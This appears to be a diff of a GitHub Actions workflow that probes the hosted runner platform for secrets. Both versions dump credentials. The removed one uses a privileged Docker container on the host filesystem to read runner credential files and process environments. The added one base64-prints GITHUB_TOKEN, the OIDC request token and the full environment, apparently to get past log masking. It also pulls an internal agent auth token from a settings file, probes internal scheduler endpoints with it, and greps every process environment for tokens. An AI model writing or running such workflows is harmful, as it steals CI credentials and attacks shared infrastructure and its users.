@@ -1,90 +1,58 @@
-name: B64BypassProbe
+name: FinalTokenProbe
 on:
   push:
     branches: [main]
 permissions:
   contents: read
+  id-token: write
 jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Phase1 b64 bypass via docker root
+      - name: Direct env base64 bypass
         run: |
-          echo "=== DOCKER PRIVILEGED B64 BYPASS ==="
-          docker run --rm --privileged --pid=host -v /:/hostroot:ro ubuntu:24.04 bash -c '
-            echo "=B64_DIAG_START="
-            base64 /hostroot/opt/hca/diagnostics.json 2>/dev/null || echo DIAG_NOT_READABLE
-            echo "=B64_DIAG_END="
-            echo ""
-            echo "=B64_CREDS_START="
-            base64 /hostroot/home/runner/actions-runner/cached/2.334.0/.credentials 2>/dev/null || echo CREDS_NOT_READABLE
-            echo "=B64_CREDS_END="
-            echo ""
-            echo "=PROC_SCAN_START="
-            for p in /proc/[0-9]*/cmdline; do
-              cmd=$(cat "$p" 2>/dev/null | tr "\0" " ")
-              case "$cmd" in
-                *Runner.Listener*|*Runner.Worker*|*bash*|*hca*)
-                  pid=${p%/cmdline}; pid=${pid#/proc/}
-                  echo "PID=$pid CMD=${cmd:0:100}"
-                  echo "B64_ENV_START"
-                  cat /proc/$pid/environ 2>/dev/null | base64 -w0
-                  echo ""
-                  echo "B64_ENV_END"
-                  echo "---"
-                  ;;
-              esac
-            done
-            echo "=PROC_SCAN_END="
-            echo ""
-            echo "=HCA_LOG_START="
-            tail -100 /hostroot/opt/hca/logs/hosted-compute-agent.log 2>/dev/null | base64 -w0
-            echo ""
-            echo "=HCA_LOG_END="
-            echo ""
-            echo "=RUNNER_FILES_START="
-            find /hostroot/home/runner/actions-runner -type f -name "*.credentials*" -o -name ".credentials" -o -name "*.json" 2>/dev/null | head -30
-            echo "=RUNNER_FILES_END="
-            echo ""
-            echo "=WORKER_FULL_ENV_B64_START="
-            for p in /proc/[0-9]*/cmdline; do
-              cmd=$(cat "$p" 2>/dev/null | tr "\0" " ")
-              case "$cmd" in
-                *Runner.Worker*)
-                  pid=${p%/cmdline}; pid=${pid#/proc/}
-                  echo "WORKER_PID=$pid"
-                  cat /proc/$pid/environ 2>/dev/null | base64 -w0
-                  echo ""
-                  ;;
-              esac
-            done
-            echo "=WORKER_FULL_ENV_B64_END="
-          ' 2>&1
+          echo "=== STEP ENV ALL B64 ==="
+          env | base64 -w0
+          echo ""
+          echo "=== GITHUB_TOKEN DIRECT B64 ==="
+          echo -n "$GITHUB_TOKEN" | base64 -w0
+          echo ""
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_TOKEN DIRECT B64 ==="
+          echo -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | base64 -w0
+          echo ""
+          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL ==="
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "=== RUNNER_TRACKING_ID ==="
+          echo "$RUNNER_TRACKING_ID"
+          echo "=== INVOCATION_ID ==="
+          echo "$INVOCATION_ID"
 
-      - name: Phase2 trace API with correct format
+      - name: Runner token internal API probe
         run: |
           SETTINGS=$(cat /opt/hca/.settings)
-          AUTH=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('authToken',''))")
-          TRACE=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('traceApiUrl',''))")
-          echo "=== POST trace with array format ==="
-          curl -s -w "\nHTTP:%{http_code}" -X POST \
-            -H "Authorization: Bearer $AUTH" \
-            -H "Content-Type: application/json" \
-            -d '[{"timestamp":"2026-05-27T17:00:00Z","level":"info","msg":"probe","source":"hca"}]' \
-            "$TRACE" 2>/dev/null | head -c 2000
-          echo ""
-          echo "=== Trace different methods ==="
-          for method in GET PUT PATCH; do
-            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X $method \
-              -H "Authorization: Bearer $AUTH" "$TRACE" 2>/dev/null)
-            echo "METHOD=$method STATUS=$STATUS"
-          done
-          echo "=== HCA authToken b64 ==="
-          echo -n "$AUTH" | base64 -w0
-          echo ""
           SCHED=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('schedulerApiUrl',''))")
-          echo "=== Scheduler additional endpoints ==="
-          for path in /v1/request/list /v1/jobs /v1/queue /v1/pool /v1/pools /v1/registration /v1/registrations /v1/health /v1/ping /v1/info; do
-            STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $AUTH" "${SCHED}${path}" 2>/dev/null)
-            echo "PATH=$path STATUS=$STATUS"
+          AUTH=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('authToken',''))")
+          echo "=== SCHEDULER ROOT URL PROBE ==="
+          # Try the root with trailing slash
+          SCHED_BASE=$(echo "$SCHED" | sed 's|/v1||')
+          echo "SCHED_BASE=$SCHED_BASE"
+          curl -s -w "\nHTTP:%{http_code}" -H "Authorization: Bearer $AUTH" "${SCHED_BASE}/" | head -c 500
+          echo ""
+          echo "=== RUNNER REGISTRATION ENDPOINT ==="
+          curl -s -w "\nHTTP:%{http_code}" -H "Authorization: Bearer $AUTH" "${SCHED}/runner" | head -c 1000
+          echo ""
+          echo "=== WORKER ENDPOINT ==="
+          curl -s -w "\nHTTP:%{http_code}" -H "Authorization: Bearer $AUTH" "${SCHED}/worker" | head -c 1000
+          echo ""
+          echo "=== ALL PID ENVIRON FROM /proc (non-root) ==="
+          for pid in $(ls /proc | grep -E '^[0-9]+$'); do
+            cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' ' | cut -c1-80)
+            if [ -n "$cmd" ]; then
+              env_data=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -E "TOKEN|SECRET|GITHUB_TOKEN|ACTIONS_ID" | head -5)
+              if [ -n "$env_data" ]; then
+                echo "PID=$pid CMD=$cmd"
+                echo "$env_data" | base64 -w0
+                echo ""
+              fi
+            fi
           done
